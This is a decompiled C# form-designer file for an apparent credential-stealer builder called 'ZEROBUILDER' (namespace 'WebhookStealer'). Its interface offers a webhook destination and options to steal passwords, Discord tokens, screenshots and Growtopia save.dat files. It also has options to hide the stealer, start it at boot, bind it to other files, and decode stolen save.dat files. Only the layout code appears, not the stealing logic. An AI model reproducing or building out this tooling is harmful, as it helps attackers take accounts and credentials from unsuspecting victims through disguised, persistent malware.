namespace WebhookStealer
{
	// Token: 0x02000003 RID: 3
	public partial class Form1 : global::MetroFramework.Forms.MetroForm
	{
		// Token: 0x0600000E RID: 14 RVA: 0x000022A2 File Offset: 0x000004A2
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.icontainer_0 != null)
			{
				this.icontainer_0.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002C50 File Offset: 0x00000E50
		private void InitializeComponent()
		{
			this.txtwebhook = new global::MetroFramework.Controls.MetroTextBox();
			this.label1 = new global::System.Windows.Forms.Label();
			this.iconcheck = new global::MetroFramework.Controls.MetroCheckBox();
			this.icontxt = new global::MetroFramework.Controls.MetroTextBox();
			this.iconbutton = new global::MetroFramework.Controls.MetroButton();
			this.compilebtn = new global::MetroFramework.Controls.MetroButton();
			this.label2 = new global::System.Windows.Forms.Label();
			this.pictureBox1 = new global::System.Windows.Forms.PictureBox();
			this.checkstart = new global::MetroFramework.Controls.MetroCheckBox();
			this.tabcontrol = new global::MetroFramework.Controls.MetroTabControl();
			this.mainpage = new global::MetroFramework.Controls.MetroTabPage();
			this.passcheck = new global::MetroFramework.Controls.MetroCheckBox();
			this.screencheck = new global::MetroFramework.Controls.MetroCheckBox();
			this.discordcheck = new global::MetroFramework.Controls.MetroCheckBox();
			this.tracecheck = new global::MetroFramework.Controls.MetroCheckBox();
			this.hidecheck = new global::MetroFramework.Controls.MetroCheckBox();
			this.bindpage = new global::MetroFramework.Controls.MetroTabPage();
			this.listView1 = new global::System.Windows.Forms.ListView();
			this.columnHeader_0 = new global::System.Windows.Forms.ColumnHeader();
			this.metroButton2 = new global::MetroFramework.Controls.MetroButton();
			this.metroButton1 = new global::MetroFramework.Controls.MetroButton();
			this.decoderpage = new global::MetroFramework.Controls.MetroTabPage();
			this.listBox1 = new global::System.Windows.Forms.ListBox();
			this.label3 = new global::System.Windows.Forms.Label();
			this.label4 = new global::System.Windows.Forms.Label();
			this.label5 = new global::System.Windows.Forms.Label();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
			this.tabcontrol.SuspendLayout();
			this.mainpage.SuspendLayout();
			this.bindpage.SuspendLayout();
			this.decoderpage.SuspendLayout();
			base.SuspendLayout();
			this.txtwebhook.CustomButton.Image = null;
			this.txtwebhook.CustomButton.Location = new global::System.Drawing.Point(507, 2);
			this.txtwebhook.CustomButton.Margin = new global::System.Windows.Forms.Padding(1);
			this.txtwebhook.CustomButton.Name = "";
			this.txtwebhook.CustomButton.Size = new global::System.Drawing.Size(13, 13);
			this.txtwebhook.CustomButton.Style = global::MetroFramework.MetroColorStyle.Blue;
			this.txtwebhook.CustomButton.TabIndex = 1;
			this.txtwebhook.CustomButton.Theme = global::MetroFramework.MetroThemeStyle.Light;
			this.txtwebhook.CustomButton.UseSelectable = true;
			this.txtwebhook.CustomButton.Visible = false;
			this.txtwebhook.Lines = new string[0];
			this.txtwebhook.Location = new global::System.Drawing.Point(5, 29);
			this.txtwebhook.Margin = new global::System.Windows.Forms.Padding(2);
			this.txtwebhook.MaxLength = 32767;
			this.txtwebhook.Multiline = true;
			this.txtwebhook.Name = "txtwebhook";
			this.txtwebhook.PasswordChar = '\0';
			this.txtwebhook.ScrollBars = global::System.Windows.Forms.ScrollBars.None;
			this.txtwebhook.SelectedText = "";
			this.txtwebhook.SelectionLength = 0;
			this.txtwebhook.SelectionStart = 0;
			this.txtwebhook.ShortcutsEnabled = true;
			this.txtwebhook.Size = new global::System.Drawing.Size(523, 18);
			this.txtwebhook.Style = global::MetroFramework.MetroColorStyle.Red;
			this.txtwebhook.TabIndex = 0;
			this.txtwebhook.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			this.txtwebhook.UseSelectable = true;
			this.txtwebhook.WaterMarkColor = global::System.Drawing.Color.FromArgb(109, 109, 109);
			this.txtwebhook.WaterMarkFont = new global::System.Drawing.Font("Segoe UI", 12f, global::System.Drawing.FontStyle.Italic, global::System.Drawing.GraphicsUnit.Pixel);
			this.label1.AutoSize = true;
			this.label1.BackColor = global::System.Drawing.Color.Transparent;
			this.label1.ForeColor = global::System.Drawing.SystemColors.ButtonHighlight;
			this.label1.Location = new global::System.Drawing.Point(2, 14);
			this.label1.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(60, 13);
			this.label1.TabIndex = 1;
			this.label1.Text = " Webhook:";
			this.iconcheck.AutoSize = true;
			this.iconcheck.FontSize = global::MetroFramework.MetroCheckBoxSize.Medium;
			this.iconcheck.Location = new global::System.Drawing.Point(5, 69);
			this.iconcheck.Margin = new global::System.Windows.Forms.Padding(2);
			this.iconcheck.Name = "iconcheck";
			this.iconcheck.Size = new global::System.Drawing.Size(51, 19);
			this.iconcheck.Style = global::MetroFramework.MetroColorStyle.Red;
			this.iconcheck.TabIndex = 2;
			this.iconcheck.Text = "Icon";
			this.iconcheck.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			this.iconcheck.UseSelectable = true;
			this.iconcheck.CheckedChanged += new global::System.EventHandler(this.iconcheck_CheckedChanged);
			this.icontxt.CustomButton.Image = null;
			this.icontxt.CustomButton.Location = new global::System.Drawing.Point(167, 2);
			this.icontxt.CustomButton.Margin = new global::System.Windows.Forms.Padding(1);
			this.icontxt.CustomButton.Name = "";
			this.icontxt.CustomButton.Size = new global::System.Drawing.Size(13, 13);
			this.icontxt.CustomButton.Style = global::MetroFramework.MetroColorStyle.Blue;
			this.icontxt.CustomButton.TabIndex = 1;
			this.icontxt.CustomButton.Theme = global::MetroFramework.MetroThemeStyle.Light;
			this.icontxt.CustomButton.UseSelectable = true;
			this.icontxt.CustomButton.Visible = false;
			this.icontxt.Lines = new string[0];
			this.icontxt.Location = new global::System.Drawing.Point(5, 103);
			this.icontxt.Margin = new global::System.Windows.Forms.Padding(2);
			this.icontxt.MaxLength = 32767;
			this.icontxt.Multiline = true;
			this.icontxt.Name = "icontxt";
			this.icontxt.PasswordChar = '\0';
			this.icontxt.ScrollBars = global::System.Windows.Forms.ScrollBars.None;
			this.icontxt.SelectedText = "";
			this.icontxt.SelectionLength = 0;
			this.icontxt.SelectionStart = 0;
			this.icontxt.ShortcutsEnabled = true;
			this.icontxt.Size = new global::System.Drawing.Size(183, 18);
			this.icontxt.Style = global::MetroFramework.MetroColorStyle.Red;
			this.icontxt.TabIndex = 3;
			this.icontxt.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			this.icontxt.UseSelectable = true;
			this.icontxt.Visible = false;
			this.icontxt.WaterMarkColor = global::System.Drawing.Color.FromArgb(109, 109, 109);
			this.icontxt.WaterMarkFont = new global::System.Drawing.Font("Segoe UI", 12f, global::System.Drawing.FontStyle.Italic, global::System.Drawing.GraphicsUnit.Pixel);
			this.iconbutton.Location = new global::System.Drawing.Point(202, 103);
			this.iconbutton.Margin = new global::System.Windows.Forms.Padding(2);
			this.iconbutton.Name = "iconbutton";
			this.iconbutton.Size = new global::System.Drawing.Size(24, 18);
			this.iconbutton.Style = global::MetroFramework.MetroColorStyle.Red;
			this.iconbutton.TabIndex = 4;
			this.iconbutton.Text = "...";
			this.iconbutton.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			this.iconbutton.UseSelectable = true;
			this.iconbutton.Visible = false;
			this.iconbutton.Click += new global::System.EventHandler(this.iconbutton_Click);
			this.compilebtn.Location = new global::System.Drawing.Point(391, 156);
			this.compilebtn.Margin = new global::System.Windows.Forms.Padding(2);
			this.compilebtn.Name = "compilebtn";
			this.compilebtn.Size = new global::System.Drawing.Size(137, 41);
			this.compilebtn.Style = global::MetroFramework.MetroColorStyle.Red;
			this.compilebtn.TabIndex = 5;
			this.compilebtn.Text = "Compile!";
			this.compilebtn.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			this.compilebtn.UseSelectable = true;
			this.compilebtn.Click += new global::System.EventHandler(this.compilebtn_Click);
			this.label2.AutoSize = true;
			this.label2.BackColor = global::System.Drawing.Color.Transparent;
			this.label2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 11f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 238);
			this.label2.ForeColor = global::System.Drawing.SystemColors.ButtonHighlight;
			this.label2.Location = new global::System.Drawing.Point(17, 168);
			this.label2.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label2.Name = "label2";
			this.label2.Size = new global::System.Drawing.Size(92, 18);
			this.label2.TabIndex = 6;
			this.label2.Text = "Icon Preview";
			this.pictureBox1.BackColor = global::System.Drawing.Color.Transparent;
			this.pictureBox1.Location = new global::System.Drawing.Point(139, 156);
			this.pictureBox1.Margin = new global::System.Windows.Forms.Padding(2);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new global::System.Drawing.Size(49, 35);
			this.pictureBox1.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.pictureBox1.TabIndex = 7;
			this.pictureBox1.TabStop = false;
			this.checkstart.AutoSize = true;
			this.checkstart.FontSize = global::MetroFramework.MetroCheckBoxSize.Medium;
			this.checkstart.Location = new global::System.Drawing.Point(250, 69);
			this.checkstart.Margin = new global::System.Windows.Forms.Padding(2);
			this.checkstart.Name = "checkstart";
			this.checkstart.Size = new global::System.Drawing.Size(137, 19);
			this.checkstart.Style = global::MetroFramework.MetroColorStyle.Red;
			this.checkstart.TabIndex = 8;
			this.checkstart.Text = "Turn on at startup";
			this.checkstart.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			this.checkstart.UseSelectable = true;
			this.tabcontrol.Controls.Add(this.mainpage);
			this.tabcontrol.Controls.Add(this.bindpage);
			this.tabcontrol.Controls.Add(this.decoderpage);
			this.tabcontrol.Location = new global::System.Drawing.Point(13, 59);
			this.tabcontrol.Margin = new global::System.Windows.Forms.Padding(2);
			this.tabcontrol.Name = "tabcontrol";
			this.tabcontrol.SelectedIndex = 0;
			this.tabcontrol.Size = new global::System.Drawing.Size(569, 255);
			this.tabcontrol.Style = global::MetroFramework.MetroColorStyle.Red;
			this.tabcontrol.TabIndex = 9;
			this.tabcontrol.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			this.tabcontrol.UseSelectable = true;
			this.mainpage.Controls.Add(this.passcheck);
			this.mainpage.Controls.Add(this.screencheck);
			this.mainpage.Controls.Add(this.discordcheck);
			this.mainpage.Controls.Add(this.tracecheck);
			this.mainpage.Controls.Add(this.hidecheck);
			this.mainpage.Controls.Add(this.checkstart);
			this.mainpage.Controls.Add(this.compilebtn);
			this.mainpage.Controls.Add(this.iconcheck);
			this.mainpage.Controls.Add(this.txtwebhook);
			this.mainpage.Controls.Add(this.label1);
			this.mainpage.Controls.Add(this.icontxt);
			this.mainpage.Controls.Add(this.iconbutton);
			this.mainpage.Controls.Add(this.label2);
			this.mainpage.Controls.Add(this.pictureBox1);
			this.mainpage.HorizontalScrollbarBarColor = true;
			this.mainpage.HorizontalScrollbarHighlightOnWheel = false;
			this.mainpage.HorizontalScrollbarSize = 6;
			this.mainpage.Location = new global::System.Drawing.Point(4, 38);
			this.mainpage.Margin = new global::System.Windows.Forms.Padding(2);
			this.mainpage.Name = "mainpage";
			this.mainpage.Size = new global::System.Drawing.Size(561, 213);
			this.mainpage.Style = global::MetroFramework.MetroColorStyle.Red;
			this.mainpage.TabIndex = 0;
			this.mainpage.Text = "Webhook";
			this.mainpage.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			this.mainpage.VerticalScrollbarBarColor = true;
			this.mainpage.VerticalScrollbarHighlightOnWheel = false;
			this.mainpage.VerticalScrollbarSize = 7;
			this.passcheck.AutoSize = true;
			this.passcheck.FontSize = global::MetroFramework.MetroCheckBoxSize.Medium;
			this.passcheck.Location = new global::System.Drawing.Point(391, 92);
			this.passcheck.Margin = new global::System.Windows.Forms.Padding(2);
			this.passcheck.Name = "passcheck";
			this.passcheck.Size = new global::System.Drawing.Size(128, 19);
			this.passcheck.Style = global::MetroFramework.MetroColorStyle.Red;
			this.passcheck.TabIndex = 13;
			this.passcheck.Text = "Password Stealer";
			this.passcheck.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			this.passcheck.UseSelectable = true;
			this.screencheck.AutoSize = true;
			this.screencheck.FontSize = global::MetroFramework.MetroCheckBoxSize.Medium;
			this.screencheck.Location = new global::System.Drawing.Point(391, 115);
			this.screencheck.Margin = new global::System.Windows.Forms.Padding(2);
			this.screencheck.Name = "screencheck";
			this.screencheck.Size = new global::System.Drawing.Size(92, 19);
			this.screencheck.Style = global::MetroFramework.MetroColorStyle.Red;
			this.screencheck.TabIndex = 12;
			this.screencheck.Text = "Screenshot";
			this.screencheck.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			this.screencheck.UseSelectable = true;
			this.discordcheck.AutoSize = true;
			this.discordcheck.FontSize = global::MetroFramework.MetroCheckBoxSize.Medium;
			this.discordcheck.Location = new global::System.Drawing.Point(391, 69);
			this.discordcheck.Margin = new global::System.Windows.Forms.Padding(2);
			this.discordcheck.Name = "discordcheck";
			this.discordcheck.Size = new global::System.Drawing.Size(111, 19);
			this.discordcheck.Style = global::MetroFramework.MetroColorStyle.Red;
			this.discordcheck.TabIndex = 11;
			this.discordcheck.Text = "Discord Token";
			this.discordcheck.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			this.discordcheck.UseSelectable = true;
			this.tracecheck.AutoSize = true;
			this.tracecheck.FontSize = global::MetroFramework.MetroCheckBoxSize.Medium;
			this.tracecheck.Location = new global::System.Drawing.Point(250, 92);
			this.tracecheck.Margin = new global::System.Windows.Forms.Padding(2);
			this.tracecheck.Name = "tracecheck";
			this.tracecheck.Size = new global::System.Drawing.Size(110, 19);
			this.tracecheck.Style = global::MetroFramework.MetroColorStyle.Red;
			this.tracecheck.TabIndex = 10;
			this.tracecheck.Text = "Trace save.dat";
			this.tracecheck.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			this.tracecheck.UseSelectable = true;
			this.hidecheck.AutoSize = true;
			this.hidecheck.FontSize = global::MetroFramework.MetroCheckBoxSize.Medium;
			this.hidecheck.Location = new global::System.Drawing.Point(250, 115);
			this.hidecheck.Margin = new global::System.Windows.Forms.Padding(2);
			this.hidecheck.Name = "hidecheck";
			this.hidecheck.Size = new global::System.Drawing.Size(97, 19);
			this.hidecheck.Style = global::MetroFramework.MetroColorStyle.Red;
			this.hidecheck.TabIndex = 9;
			this.hidecheck.Text = "Hide stealer";
			this.hidecheck.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			this.hidecheck.UseSelectable = true;
			this.bindpage.BackColor = global::System.Drawing.SystemColors.Control;
			this.bindpage.Controls.Add(this.listView1);
			this.bindpage.Controls.Add(this.metroButton2);
			this.bindpage.Controls.Add(this.metroButton1);
			this.bindpage.HorizontalScrollbarBarColor = true;
			this.bindpage.HorizontalScrollbarHighlightOnWheel = false;
			this.bindpage.HorizontalScrollbarSize = 6;
			this.bindpage.Location = new global::System.Drawing.Point(4, 38);
			this.bindpage.Margin = new global::System.Windows.Forms.Padding(2);
			this.bindpage.Name = "bindpage";
			this.bindpage.Size = new global::System.Drawing.Size(561, 213);
			this.bindpage.Style = global::MetroFramework.MetroColorStyle.Red;
			this.bindpage.TabIndex = 1;
			this.bindpage.Text = " Binder";
			this.bindpage.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			this.bindpage.VerticalScrollbarBarColor = true;
			this.bindpage.VerticalScrollbarHighlightOnWheel = false;
			this.bindpage.VerticalScrollbarSize = 7;
			this.listView1.AllowDrop = true;
			this.listView1.BackColor = global::System.Drawing.Color.Black;
			this.listView1.Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[]
			{
				this.columnHeader_0
			});
			this.listView1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.listView1.ForeColor = global::System.Drawing.SystemColors.ButtonHighlight;
			this.listView1.FullRowSelect = true;
			this.listView1.HideSelection = false;
			this.listView1.Location = new global::System.Drawing.Point(0, 16);
			this.listView1.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
			this.listView1.MultiSelect = false;
			this.listView1.Name = "listView1";
			this.listView1.Size = new global::System.Drawing.Size(561, 161);
			this.listView1.TabIndex = 8;
			this.listView1.UseCompatibleStateImageBehavior = false;
			this.listView1.View = global::System.Windows.Forms.View.Details;
			this.listView1.SelectedIndexChanged += new global::System.EventHandler(this.listView1_SelectedIndexChanged);
			this.columnHeader_0.Text = "File";
			this.columnHeader_0.Width = 555;
			this.metroButton2.Location = new global::System.Drawing.Point(330, 184);
			this.metroButton2.Margin = new global::System.Windows.Forms.Padding(2);
			this.metroButton2.Name = "metroButton2";
			this.metroButton2.Size = new global::System.Drawing.Size(117, 29);
			this.metroButton2.Style = global::MetroFramework.MetroColorStyle.Red;
			this.metroButton2.TabIndex = 7;
			this.metroButton2.Text = "Remove";
			this.metroButton2.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			this.metroButton2.UseSelectable = true;
			this.metroButton2.Click += new global::System.EventHandler(this.metroButton2_Click);
			this.metroButton1.Location = new global::System.Drawing.Point(81, 184);
			this.metroButton1.Margin = new global::System.Windows.Forms.Padding(2);
			this.metroButton1.Name = "metroButton1";
			this.metroButton1.Size = new global::System.Drawing.Size(117, 29);
			this.metroButton1.Style = global::MetroFramework.MetroColorStyle.Red;
			this.metroButton1.TabIndex = 6;
			this.metroButton1.Text = "Add";
			this.metroButton1.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			this.metroButton1.UseSelectable = true;
			this.metroButton1.Click += new global::System.EventHandler(this.metroButton1_Click);
			this.decoderpage.Controls.Add(this.listBox1);
			this.decoderpage.Controls.Add(this.label3);
			this.decoderpage.Controls.Add(this.label4);
			this.decoderpage.Controls.Add(this.label5);
			this.decoderpage.HorizontalScrollbarBarColor = true;
			this.decoderpage.HorizontalScrollbarHighlightOnWheel = false;
			this.decoderpage.HorizontalScrollbarSize = 10;
			this.decoderpage.Location = new global::System.Drawing.Point(4, 38);
			this.decoderpage.Name = "decoderpage";
			this.decoderpage.Size = new global::System.Drawing.Size(561, 213);
			this.decoderpage.Style = global::MetroFramework.MetroColorStyle.Red;
			this.decoderpage.TabIndex = 2;
			this.decoderpage.Text = " Decoder";
			this.decoderpage.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			this.decoderpage.VerticalScrollbarBarColor = true;
			this.decoderpage.VerticalScrollbarHighlightOnWheel = false;
			this.decoderpage.VerticalScrollbarSize = 10;
			this.listBox1.AllowDrop = true;
			this.listBox1.BackColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			this.listBox1.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.listBox1.ForeColor = global::System.Drawing.SystemColors.ButtonHighlight;
			this.listBox1.FormattingEnabled = true;
			this.listBox1.Location = new global::System.Drawing.Point(231, 13);
			this.listBox1.Name = "listBox1";
			this.listBox1.Size = new global::System.Drawing.Size(198, 184);
			this.listBox1.TabIndex = 9;
			this.listBox1.DragDrop += new global::System.Windows.Forms.DragEventHandler(this.listBox1_DragDrop);
			this.listBox1.DragEnter += new global::System.Windows.Forms.DragEventHandler(this.listBox1_DragEnter);
			this.label3.AutoSize = true;
			this.label3.BackColor = global::System.Drawing.Color.Transparent;
			this.label3.ForeColor = global::System.Drawing.SystemColors.ButtonHighlight;
			this.label3.Location = new global::System.Drawing.Point(15, 22);
			this.label3.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label3.Name = "label3";
			this.label3.Size = new global::System.Drawing.Size(46, 13);
			this.label3.TabIndex = 8;
			this.label3.Text = "GrowID:";
			this.label4.AutoSize = true;
			this.label4.BackColor = global::System.Drawing.Color.Transparent;
			this.label4.ForeColor = global::System.Drawing.SystemColors.ButtonHighlight;
			this.label4.Location = new global::System.Drawing.Point(15, 86);
			this.label4.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label4.Name = "label4";
			this.label4.Size = new global::System.Drawing.Size(61, 13);
			this.label4.TabIndex = 7;
			this.label4.Text = "Last World:";
			this.label5.AutoSize = true;
			this.label5.BackColor = global::System.Drawing.Color.Transparent;
			this.label5.ForeColor = global::System.Drawing.SystemColors.ButtonHighlight;
			this.label5.Location = new global::System.Drawing.Point(15, 168);
			this.label5.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label5.Name = "label5";
			this.label5.Size = new global::System.Drawing.Size(148, 13);
			this.label5.TabIndex = 6;
			this.label5.Text = "Drop you save.dat into the box!";
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(595, 319);
			base.Controls.Add(this.tabcontrol);
			base.Margin = new global::System.Windows.Forms.Padding(2);
			base.Name = "Form1";
			base.Padding = new global::System.Windows.Forms.Padding(13, 60, 13, 13);
			base.Style = global::MetroFramework.MetroColorStyle.Red;
			this.Text = "ZEROBUILDER";
			base.Theme = global::MetroFramework.MetroThemeStyle.Dark;
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
			this.tabcontrol.ResumeLayout(false);
			this.mainpage.ResumeLayout(false);
			this.mainpage.PerformLayout();
			this.bindpage.ResumeLayout(false);
			this.decoderpage.ResumeLayout(false);
			this.decoderpage.PerformLayout();
			base.ResumeLayout(false);
		}

		// Token: 0x04000001 RID: 1
		private global::System.ComponentModel.IContainer icontainer_0;

		// Token: 0x04000002 RID: 2
		private global::MetroFramework.Controls.MetroTextBox txtwebhook;

		// Token: 0x04000003 RID: 3
		private global::System.Windows.Forms.Label label1;

		// Token: 0x04000004 RID: 4
		private global::MetroFramework.Controls.MetroCheckBox iconcheck;

		// Token: 0x04000005 RID: 5
		private global::MetroFramework.Controls.MetroTextBox icontxt;

		// Token: 0x04000006 RID: 6
		private global::MetroFramework.Controls.MetroButton iconbutton;

		// Token: 0x04000007 RID: 7
		private global::MetroFramework.Controls.MetroButton compilebtn;

		// Token: 0x04000008 RID: 8
		private global::System.Windows.Forms.Label label2;

		// Token: 0x04000009 RID: 9
		private global::System.Windows.Forms.PictureBox pictureBox1;

		// Token: 0x0400000A RID: 10
		private global::MetroFramework.Controls.MetroCheckBox checkstart;

		// Token: 0x0400000B RID: 11
		private global::MetroFramework.Controls.MetroTabControl tabcontrol;

		// Token: 0x0400000C RID: 12
		private global::MetroFramework.Controls.MetroTabPage mainpage;

		// Token: 0x0400000D RID: 13
		private global::MetroFramework.Controls.MetroTabPage bindpage;

		// Token: 0x0400000E RID: 14
		private global::MetroFramework.Controls.MetroButton metroButton2;

		// Token: 0x0400000F RID: 15
		private global::MetroFramework.Controls.MetroButton metroButton1;

		// Token: 0x04000010 RID: 16
		private global::System.Windows.Forms.ListView listView1;

		// Token: 0x04000011 RID: 17
		private global::System.Windows.Forms.ColumnHeader columnHeader_0;

		// Token: 0x04000012 RID: 18
		private global::MetroFramework.Controls.MetroCheckBox tracecheck;

		// Token: 0x04000013 RID: 19
		private global::MetroFramework.Controls.MetroCheckBox hidecheck;

		// Token: 0x04000014 RID: 20
		private global::MetroFramework.Controls.MetroTabPage decoderpage;

		// Token: 0x04000015 RID: 21
		private global::System.Windows.Forms.Label label5;

		// Token: 0x04000016 RID: 22
		private global::System.Windows.Forms.ListBox listBox1;

		// Token: 0x04000017 RID: 23
		private global::System.Windows.Forms.Label label3;

		// Token: 0x04000018 RID: 24
		private global::System.Windows.Forms.Label label4;

		// Token: 0x04000019 RID: 25
		private global::MetroFramework.Controls.MetroCheckBox discordcheck;

		// Token: 0x0400001A RID: 26
		private global::MetroFramework.Controls.MetroCheckBox screencheck;

		// Token: 0x0400001B RID: 27
		private global::MetroFramework.Controls.MetroCheckBox passcheck;
	}
}
